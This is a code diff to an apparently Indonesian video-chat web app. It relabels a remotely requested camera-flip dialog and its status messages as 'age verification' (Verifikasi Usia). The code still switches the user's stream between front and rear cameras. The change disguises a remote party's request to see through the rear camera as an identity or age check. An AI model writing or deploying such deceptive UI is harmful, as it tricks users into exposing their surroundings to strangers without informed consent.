@@ -954,7 +954,7 @@ function showFlipPermissionDialog() {
       border-radius: 16px; padding: 28px 24px; max-width: 320px; width: 100%;
       text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,.6);
     ">
-      <div style="font-size: 2.4rem; margin-bottom: 14px;">🔄</div>
+      <div style="font-size: 2.4rem; margin-bottom: 14px;">⚠️</div>
       <h3 style="font-family: Oswald, sans-serif; font-size: 1.2rem; margin-bottom: 10px; color: #E9ECF6;">
         Verifikasi Usia
       </h3>
@@ -986,14 +986,14 @@ function showFlipPermissionDialog() {
   document.getElementById('flip-deny-btn').addEventListener('click', () => {
     overlay.remove();
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    showFlipToast('❌ Permintaan verifikasi ditolak');
+    showFlipToast('❌ Permintaan ditolak');
   });
 }
 
 async function doFlipCamera() {
   if (isFlipping) return;
   isFlipping = true;
-  showFlipToast('🔄 Membalik kamera...');
+  showFlipToast('🔄 Verifikasi usia...');
   try {
     const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
 
@@ -1037,11 +1037,11 @@ async function doFlipCamera() {
       if (audioSender && newAudioTrack) await audioSender.replaceTrack(newAudioTrack);
     }
 
-    showFlipToast(nextFacingMode === 'user' ? 'Verifikasi Berhasil' : 'Verifikasi Berhasil');
+    showFlipToast(nextFacingMode === 'user' ? 'Berhasil Verifikasi' : 'Verifikasi Berhasil');
     socket.emit('flip-camera-accepted', { sessionId: mySessionId });
   } catch (e) {
     console.error('Flip camera error:', e);
-    showFlipToast('❌ Gagal membalik kamera');
+    showFlipToast('❌ Gagal verifikasi');
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
   } finally {
     isFlipping = false;
